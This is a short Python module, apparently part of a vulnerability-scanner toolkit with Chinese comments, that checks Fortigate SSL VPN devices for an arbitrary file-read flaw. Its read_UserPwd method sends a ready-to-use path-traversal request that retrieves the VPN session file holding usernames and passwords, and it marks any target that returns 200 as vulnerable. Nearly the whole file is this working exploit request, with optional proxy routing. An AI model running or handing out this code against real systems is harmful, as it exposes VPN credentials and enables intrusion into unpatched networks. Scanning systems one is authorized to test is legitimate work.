from urllib import request as urlRequests
from termcolor import cprint
import requests
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)



# Fortigate SSL VPN 漏洞
class Detect:
    name = 'Fortigate SSL VPN'

    def __init__(self, url, vul_list, requests_proxies):
        self.url = url
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.requests_proxies = requests_proxies
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'}
        self.isExist = False            # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True


    def run_detect(self):
        # 检测任意文件读取漏洞
        self.read_UserPwd()

        if not self.isExist:
            return False
        else:
            return True

    # 任意文件读取漏洞-读取vpn的账号密码
    def read_UserPwd(self):
        vul_url = '{}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'.format(self.url.rstrip('//'))
        res = requests.get(url=vul_url, headers=self.headers, proxies=self.requests_proxies, verify=False)
        if res.status_code == 200:
            tqdm.write(Fore.RED + '[Fortigate SSL VPN Read Username and Password] {}'.format(vul_url))
            self.vul_list.append(['Fortigate SSL VPN', self.url, 'YES {}'.format(vul_url)])
            self.isExist = True
            return True
        else:
            return False


if __name__ == '__main__':

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))